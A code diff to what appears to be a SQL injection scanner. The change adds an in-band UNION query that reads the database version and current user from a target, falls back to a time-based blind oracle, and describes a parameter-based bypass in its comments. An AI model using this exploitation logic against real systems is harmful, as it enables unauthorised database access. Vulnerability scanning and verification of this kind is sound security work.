@@ -1013,16 +1013,28 @@ def scan_one(url, args):
         rec["status"] = "not_vulnerable"
     code = 0 if rec["status"] in ("vulnerable", "affected_version") else 1
     if active and args.proof:
-        # read_scalar uses the time-based oracle; establish a latency baseline if the
-        # boolean method confirmed without ever running the timing probe.
-        if t._base <= 0:
+        # Fast path first: in-band UNION read pulls BOTH scalars in a single request (the
+        # per_page>=500 split_the_query bypass echoes the forged rows back), ~250x fewer
+        # requests than the blind ladder. The time-based blind oracle is the per-scalar
+        # fallback -- used only for whichever scalar doesn't echo (e.g. a persistent object
+        # cache forces split_the_query and blocks the echo). Read-only on either path.
+        proof_exprs = {"@@version": ("SELECT @@version", 40),
+                       "current_user()": ("SELECT CURRENT_USER()", 48)}
+        try:
+            vals = t._inband_read([expr for expr, _ in proof_exprs.values()])
+        except Exception:
+            vals = [None] * len(proof_exprs)
+        # Only warm up a latency baseline if we actually have to fall back to the blind oracle
+        # (the boolean detector may have confirmed without ever running the timing probe).
+        if any(v is None for v in vals) and t._base <= 0:
             try:
                 t.detect(rounds=args.rounds)
             except urllib.error.URLError:
                 pass
         try:
-            rec["proof"] = {"@@version": t.read_scalar("SELECT @@version", 40),
-                            "current_user()": t.read_scalar("SELECT CURRENT_USER()", 48)}
+            rec["proof"] = {
+                label: (v if v is not None else t.read_scalar(expr, maxlen))
+                for (label, (expr, maxlen)), v in zip(proof_exprs.items(), vals)}
         except Exception as e:
             rec["proof_error"] = str(e)
     return rec, code
